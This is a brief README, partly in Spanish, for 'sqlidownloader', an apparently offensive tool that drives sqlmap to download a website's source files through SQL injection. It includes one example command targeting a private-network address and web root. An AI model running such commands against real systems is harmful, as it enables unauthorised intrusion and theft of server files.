# sqlidownloader
SQL Injection tool based on file_reader.pl of Phineas Fisher Perl tool

###Modo de uso
```

./sqlidownloader.py [SQLMAP URL and PARAMS] [output-folder] [web_document_root_path] [first_file_or_index_file]

Example

./sqlidownloader.py "-u http://192.168.0.222/sqliweb/noticias.php?id=2 --dbms=mysql -p id --technique=U" prueba "/var/www/sqliweb" "/var/www/sqliweb/noticias.php"
```
